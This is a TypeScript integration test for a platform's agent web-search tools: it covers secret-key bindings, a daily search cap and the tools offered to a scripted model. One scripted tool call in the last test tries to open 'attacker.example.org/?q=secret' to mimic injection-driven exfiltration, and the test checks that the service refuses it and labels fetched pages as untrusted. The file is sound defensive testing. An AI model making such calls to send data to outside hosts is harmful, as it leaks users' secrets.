import { randomUUID } from "node:crypto";
import { mkdirSync, rmSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from "vitest";
import { and, eq } from "drizzle-orm";
import {
  activityLog,
  agentDailyCounters,
  agents,
  companies,
  companySecretBindings,
  companySecretVersions,
  companySecrets,
  costEvents,
  createDb,
  laneAConversations,
  laneAMessages,
  secretAccessEvents,
} from "@paperclipai/db";
import { WEB_SEARCH_KEY_CONFIG_PATH } from "@paperclipai/shared";
import { getEmbeddedPostgresTestSupport, startEmbeddedPostgresTestDatabase } from "./helpers/embedded-postgres.js";
import { agentService } from "../services/agents.ts";
import { secretService } from "../services/secrets.ts";
import { laneAService } from "../services/lane-a.ts";
import type { LaneAModelClient } from "../services/lane-a-providers.ts";
import { webSearchService } from "../services/web-search.ts";
import { WebToolError } from "../services/lane-a-web-tools.ts";

/**
 * Web search for quick agents against a real Postgres (every migration
 * applied): the company's Brave key as a secret binding, the per-company
 * daily cap counted in agent_daily_counters, and, end to end through a chat,
 * which tools a quick agent is offered. Brave and every web page are fakes.
 */

const support = await getEmbeddedPostgresTestSupport();
const d = support.supported ? describe : describe.skip;
if (!support.supported) {
  console.warn(`Skipping quick-agent web search tests: ${support.reason ?? "unsupported environment"}`);
}

const BRAVE_KEY = "BSA-test-key-0123456789abcdefghijkl";

function braveAnswer() {
  return new Response(
    JSON.stringify({
      web: {
        results: [
          { title: "Brann 2-1 Rosenborg", url: "https://www.nrk.no/sport/kamp", description: "Brann vant.", age: "1 hour ago" },
        ],
      },
    }),
    { status: 200, headers: { "content-type": "application/json" } },
  );
}

d("quick-agent web search", () => {
  let stopDb: (() => Promise<void>) | null = null;
  let db!: ReturnType<typeof createDb>;
  const previousKeyFile = process.env.PAPERCLIP_SECRETS_MASTER_KEY_FILE;
  const secretsTmpDir = path.join(os.tmpdir(), `paperclip-web-search-${randomUUID()}`);
  vi.setConfig({ testTimeout: 60_000 });

  beforeAll(async () => {
    mkdirSync(secretsTmpDir, { recursive: true });
    process.env.PAPERCLIP_SECRETS_MASTER_KEY_FILE = path.join(secretsTmpDir, "master.key");
    const started = await startEmbeddedPostgresTestDatabase("quick-agent-web-search");
    stopDb = started.cleanup;
    db = createDb(started.connectionString);
  }, 90_000);

  afterEach(async () => {
    await db.delete(agentDailyCounters);
    await db.delete(laneAMessages);
    await db.delete(laneAConversations);
    await db.delete(activityLog);
    await db.delete(costEvents);
    await db.delete(secretAccessEvents);
    await db.delete(companySecretBindings);
    await db.delete(companySecretVersions);
    await db.delete(companySecrets);
    await db.delete(agents);
    await db.delete(companies);
  });

  afterAll(async () => {
    await stopDb?.();
    if (previousKeyFile === undefined) delete process.env.PAPERCLIP_SECRETS_MASTER_KEY_FILE;
    else process.env.PAPERCLIP_SECRETS_MASTER_KEY_FILE = previousKeyFile;
    rmSync(secretsTmpDir, { recursive: true, force: true });
  });

  async function seedCompany(name = "Nordstrand") {
    const companyId = randomUUID();
    await db.insert(companies).values({
      id: companyId,
      name,
      issuePrefix: `W${companyId.replace(/-/g, "").slice(0, 6).toUpperCase()}`,
      requireBoardApprovalForNewAgents: false,
    });
    return companyId;
  }

  async function seedAgent(companyId: string, name = "Maja", webSearch = false) {
    const created = await agentService(db).create(companyId, {
      name,
      role: "general",
      status: "active",
      adapterType: "claude_local",
      adapterConfig: webSearch ? { laneA: { webSearch: true } } : {},
      runtimeConfig: {},
      spentMonthlyCents: 0,
      lastHeartbeatAt: null,
    });
    await db.update(agents).set({ laneAEnabled: true }).where(eq(agents.id, created.id));
    return { id: created.id, companyId, name: created.name, laneAEnabled: true };
  }

  async function seedBraveKey(companyId: string, value = BRAVE_KEY) {
    return secretService(db).create(companyId, {
      name: `Brave ${randomUUID().slice(0, 8)}`,
      provider: "local_encrypted",
      value,
      kind: "brave_search_api_key",
    });
  }

  async function setUsedToday(companyId: string, agentId: string, count: number) {
    await db.insert(agentDailyCounters).values({
      companyId,
      agentId,
      kind: "web_search",
      day: new Date().toISOString().slice(0, 10),
      count,
    });
  }

  const caller = (agentId: string) => ({ agentId, userId: "filip", actorType: "user" as const, actorId: "filip" });
  const request = { query: "Brann Rosenborg", count: 5, freshness: "day" as const, news: false };

  describe("the company's key", () => {
    it("is picked as a binding, shown by name, resolved with an audit row, and removed again", async () => {
      const companyId = await seedCompany();
      const secret = await seedBraveKey(companyId);
      const svc = webSearchService(db);

      expect(await svc.getSettings(companyId)).toEqual({
        keySecretId: null,
        keySecretName: null,
        keySecretKind: null,
        keyStatus: "none",
        dailyCap: 100,
        usedToday: 0,
      });

      const saved = await svc.setKey(companyId, secret.id, { userId: "filip" });
      expect(saved).toMatchObject({ keySecretId: secret.id, keySecretName: secret.name, keySecretKind: "brave_search_api_key", keyStatus: "ok" });
      expect(JSON.stringify(saved)).not.toContain(BRAVE_KEY);
      const bindings = await db.select().from(companySecretBindings).where(eq(companySecretBindings.companyId, companyId));
      expect(bindings).toHaveLength(1);
      expect(bindings[0]).toMatchObject({ secretId: secret.id, targetType: "web_search", targetId: companyId, configPath: WEB_SEARCH_KEY_CONFIG_PATH });

      expect(await svc.resolveKey(companyId, { agentId: randomUUID(), userId: "filip", actorType: "user", actorId: "filip" })).toBe(BRAVE_KEY);
      const reads = await db.select().from(secretAccessEvents).where(eq(secretAccessEvents.secretId, secret.id));
      expect(reads.some((row) => row.consumerType === "web_search" && row.consumerId === companyId && row.outcome === "success")).toBe(true);

      const logged = await db.select().from(activityLog).where(eq(activityLog.action, "company.web_search_key_set"));
      expect(logged).toHaveLength(1);

      expect((await svc.setKey(companyId, null, { userId: "filip" })).keyStatus).toBe("none");
      expect(await db.select().from(companySecretBindings).where(eq(companySecretBindings.companyId, companyId))).toHaveLength(0);
      expect(await svc.resolveKey(companyId, caller(randomUUID()))).toBeNull();
    });

    it("takes a key saved earlier with kind \"other\", so nobody has to save it again", async () => {
      const companyId = await seedCompany();
      const saved = await secretService(db).create(companyId, {
        name: "Brave_Search_API",
        provider: "local_encrypted",
        value: BRAVE_KEY,
        kind: "other",
      });
      const svc = webSearchService(db);
      expect(await svc.setKey(companyId, saved.id, { userId: "filip" })).toMatchObject({
        keySecretName: "Brave_Search_API",
        keySecretKind: "other",
        keyStatus: "ok",
      });
      expect(await svc.resolveKey(companyId, caller(randomUUID()))).toBe(BRAVE_KEY);
    });

    it("refuses another company's secret, and reads a switched-off secret as unusable", async () => {
      const companyId = await seedCompany("A");
      const otherId = await seedCompany("B");
      const foreign = await seedBraveKey(otherId);
      const svc = webSearchService(db);
      await expect(svc.setKey(companyId, foreign.id, { userId: "filip" })).rejects.toMatchObject({ status: 404 });

      const own = await seedBraveKey(companyId);
      await svc.setKey(companyId, own.id, { userId: "filip" });
      await db.update(companySecrets).set({ status: "disabled" }).where(eq(companySecrets.id, own.id));
      expect((await svc.getSettings(companyId)).keyStatus).toBe("unusable");
      expect(await svc.hasUsableKey(companyId)).toBe(false);
    });
  });

  describe("a search", () => {
    it("sends the key in the header, counts the search for the agent, and returns results", async () => {
      const companyId = await seedCompany();
      const agent = await seedAgent(companyId);
      const secret = await seedBraveKey(companyId);
      const braveFetch = vi.fn(async (_url: string | URL, _init?: RequestInit) => braveAnswer()) as unknown as typeof fetch;
      const svc = webSearchService(db, { braveFetch });
      await svc.setKey(companyId, secret.id, { userId: "filip" });

      const outcome = await svc.search(companyId, request, caller(agent.id));
      expect(outcome).toMatchObject({ used: 1, cap: 100, results: [{ url: "https://www.nrk.no/sport/kamp", site: "nrk.no" }] });
      const [url, init] = (braveFetch as unknown as ReturnType<typeof vi.fn>).mock.calls[0]!;
      expect(String(url)).toContain("https://api.search.brave.com/res/v1/web/search?q=Brann+Rosenborg&count=5");
      expect(String(url)).not.toContain(BRAVE_KEY);
      expect((init as RequestInit).headers).toMatchObject({ "x-subscription-token": BRAVE_KEY });

      const counters = await db.select().from(agentDailyCounters).where(eq(agentDailyCounters.agentId, agent.id));
      expect(counters).toEqual([expect.objectContaining({ kind: "web_search", count: 1, companyId })]);
      expect((await svc.getSettings(companyId)).usedToday).toBe(1);
    });

    it("refuses without a key, and does not count or call Brave", async () => {
      const companyId = await seedCompany();
      const agent = await seedAgent(companyId);
      const braveFetch = vi.fn() as unknown as typeof fetch;
      const failure = await webSearchService(db, { braveFetch }).search(companyId, request, caller(agent.id)).catch((e) => e);
      expect(failure).toBeInstanceOf(WebToolError);
      expect(failure.message).toContain("Company settings → Connections → Web search");
      expect(braveFetch).not.toHaveBeenCalled();
      expect(await db.select().from(agentDailyCounters)).toHaveLength(0);
    });

    it("stops at 100 searches a day for the whole company, whichever agents made them", async () => {
      const companyId = await seedCompany();
      const maja = await seedAgent(companyId, "Maja");
      const ola = await seedAgent(companyId, "Ola");
      const secret = await seedBraveKey(companyId);
      const braveFetch = vi.fn(async () => braveAnswer()) as unknown as typeof fetch;
      const svc = webSearchService(db, { braveFetch });
      await svc.setKey(companyId, secret.id, { userId: "filip" });
      await setUsedToday(companyId, maja.id, 60);
      await setUsedToday(companyId, ola.id, 40);

      const failure = await svc.search(companyId, request, caller(maja.id)).catch((e) => e);
      expect(failure).toBeInstanceOf(WebToolError);
      expect(failure.message).toContain("used all 100 web searches for today");
      expect(braveFetch).not.toHaveBeenCalled();
      expect(await svc.usedToday(companyId)).toBe(100);

      // Another company is not affected.
      const otherId = await seedCompany("Other");
      const other = await seedAgent(otherId, "Kari");
      expect((await svc.reserveSearch(otherId, other.id)).allowed).toBe(true);
    });

    it("lets exactly one of two searches racing for the last slot through", async () => {
      const companyId = await seedCompany();
      const maja = await seedAgent(companyId, "Maja");
      const ola = await seedAgent(companyId, "Ola");
      await setUsedToday(companyId, maja.id, 99);
      const svc = webSearchService(db);
      const [a, b] = await Promise.all([svc.reserveSearch(companyId, maja.id), svc.reserveSearch(companyId, ola.id)]);
      expect([a.allowed, b.allowed].filter(Boolean)).toHaveLength(1);
      expect(await svc.usedToday(companyId)).toBe(100);
    });
  });

  describe("through a quick-agent chat", () => {
    type Call = { system: string; tools?: Array<{ name: string }>; messages: unknown[] };

    function scriptedClaude(steps: Array<{ name: string; input: Record<string, unknown> }>) {
      const calls: Call[] = [];
      let round = 0;
      const create = vi.fn(async (body: Call) => {
        calls.push(JSON.parse(JSON.stringify(body)) as Call);
        const step = steps[round];
        round++;
        if (step) {
          return {
            content: [{ type: "tool_use", id: `toolu_${round}`, name: step.name, input: step.input }],
            usage: { input_tokens: 10, output_tokens: 5 },
            stop_reason: "tool_use",
          };
        }
        return {
          content: [{ type: "text", text: "Brann vant 2-1 (kilde: nrk.no)." }],
          usage: { input_tokens: 10, output_tokens: 5 },
          stop_reason: "end_turn",
        };
      });
      return { client: { messages: { create } } as unknown as LaneAModelClient, calls };
    }

    const board = (companyId: string) => ({ type: "board" as const, userId: "filip", companyIds: [companyId], source: "session" as const });
    const toolNames = (call: Call) => (call.tools ?? []).map((tool) => tool.name);

    it("offers neither web tool while the switch is off, even with a key; get_time is always there", async () => {
      const companyId = await seedCompany();
      const agent = await seedAgent(companyId, "Maja", false);
      const secret = await seedBraveKey(companyId);
      await webSearchService(db).setKey(companyId, secret.id, { userId: "filip" });
      const model = scriptedClaude([]);
      await laneAService(db, { createModelClient: () => model.client }).sendMessage({
        companyId,
        targetAgent: agent,
        requester: { userId: "filip", agentId: null },
        actor: board(companyId),
        message: "Hva ble Brann-Rosenborg? https://www.nrk.no/sport/kamp",
      });
      expect(toolNames(model.calls[0]!)).toContain("get_time");
      expect(toolNames(model.calls[0]!)).not.toContain("web_search");
      expect(toolNames(model.calls[0]!)).not.toContain("read_web_page");
      expect(model.calls[0]!.system).toContain("You cannot look anything up on the web.");
    });

    it("offers only read_web_page when the switch is on but the company has no key", async () => {
      const companyId = await seedCompany();
      const agent = await seedAgent(companyId, "Maja", true);
      const model = scriptedClaude([]);
      await laneAService(db, { createModelClient: () => model.client }).sendMessage({
        companyId,
        targetAgent: agent,
        requester: { userId: "filip", agentId: null },
        actor: board(companyId),
        message: "Les denne: https://www.nrk.no/sport/kamp",
      });
      expect(toolNames(model.calls[0]!)).toContain("read_web_page");
      expect(toolNames(model.calls[0]!)).not.toContain("web_search");
      expect(model.calls[0]!.system).toContain("You cannot search the web");
    });

    it("searches, reads a result, logs both calls and counts one search, with the switch on and a key", async () => {
      const companyId = await seedCompany();
      const agent = await seedAgent(companyId, "Maja", true);
      const secret = await seedBraveKey(companyId);
      await webSearchService(db).setKey(companyId, secret.id, { userId: "filip" });
      const braveFetch = vi.fn(async () => braveAnswer()) as unknown as typeof fetch;
      const pageFetch = vi.fn(async () =>
        new Response("<html><title>Kamp</title><main><p>" + "Brann slo Rosenborg 2-1 foran 16 000. ".repeat(10) + "</p></main></html>", {
          status: 200,
          headers: { "content-type": "text/html; charset=utf-8" },
        }),
      ) as unknown as typeof fetch;
      const model = scriptedClaude([
        { name: "web_search", input: { query: "Brann Rosenborg", freshness: "day" } },
        { name: "read_web_page", input: { url: "https://www.nrk.no/sport/kamp" } },
        { name: "read_web_page", input: { url: "https://attacker.example.org/?q=secret" } },
      ]);
      const result = await laneAService(db, {
        createModelClient: () => model.client,
        webSearch: { braveFetch, pageFetch },
      }).sendMessage({
        companyId,
        targetAgent: agent,
        requester: { userId: "filip", agentId: null },
        actor: board(companyId),
        message: "Hvordan gikk Brann mot Rosenborg i dag?",
      });

      expect(toolNames(model.calls[0]!)).toEqual(expect.arrayContaining(["get_time", "web_search", "read_web_page"]));
      expect(model.calls[0]!.system).toContain("Live facts and the web:");
      expect(result.response).toBe("Brann vant 2-1 (kilde: nrk.no).");
      expect(result.actions).toEqual([
        { tool: "web_search", ok: true, summary: 'Searched the web for "Brann Rosenborg" (1 result; search 1 of 100 today).' },
        { tool: "read_web_page", ok: true, summary: "Read a web page on www.nrk.no." },
        { tool: "read_web_page", ok: false, summary: "Refused to open attacker.example.org: it did not come from the person or from a search." },
      ]);
      expect(braveFetch).toHaveBeenCalledTimes(1);
      expect(pageFetch).toHaveBeenCalledTimes(1);
      expect(String((pageFetch as unknown as ReturnType<typeof vi.fn>).mock.calls[0]![0])).toBe("https://www.nrk.no/sport/kamp");

      const logged = await db
        .select()
        .from(activityLog)
        .where(and(eq(activityLog.companyId, companyId), eq(activityLog.action, "lane_a.tool_called")));
      expect(logged.map((row) => (row.details as { tool: string }).tool)).toEqual(["web_search", "read_web_page", "read_web_page"]);
      expect(logged[0]!.details).toMatchObject({ input: { query: "Brann Rosenborg", freshness: "day" }, ok: true });
      expect(JSON.stringify(logged)).not.toContain(BRAVE_KEY);
      expect(await webSearchService(db).usedToday(companyId)).toBe(1);

      // The model saw the page as untrusted text.
      const lastTurn = JSON.stringify(model.calls[3]!.messages);
      expect(lastTurn).toContain("UNTRUSTED PAGE TEXT");
      expect(lastTurn).not.toContain(BRAVE_KEY);
    });
  });
});
